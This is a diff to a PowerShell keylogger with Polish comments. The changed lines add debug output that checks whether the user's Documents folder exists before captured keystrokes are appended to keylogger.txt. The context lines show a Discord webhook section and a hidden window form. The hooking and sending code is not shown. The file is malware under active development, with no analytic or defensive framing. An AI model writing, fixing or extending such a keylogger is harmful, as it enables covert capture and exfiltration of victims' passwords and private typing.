@@ -1,7 +1,7 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Ścieżka do pliku logu - zmiana na Documents
+# Ścieżka do pliku logu
 $logPath = "$env:USERPROFILE\Documents\keylogger.txt"
 
 # Webhook Discorda
@@ -14,6 +14,13 @@ $global:loggedKeys = ""
 function Save-Log {
     try {
         Write-Host "Zapisuję logi do pliku: $logPath"
+        # Debugowanie, czy folder Documents istnieje
+        if (Test-Path "$env:USERPROFILE\Documents") {
+            Write-Host "Folder Documents istnieje."
+        } else {
+            Write-Host "Folder Documents NIE istnieje!"
+        }
+
         $global:loggedKeys | Out-File -Append -Encoding UTF8 -FilePath $logPath
         $global:loggedKeys = ""
     } catch {
@@ -83,3 +90,4 @@ $shutdownTimer.Start()
 # Start ukrytego formularza
 $form.Add_Shown({ $form.Hide() })
 [void]$form.ShowDialog()
+
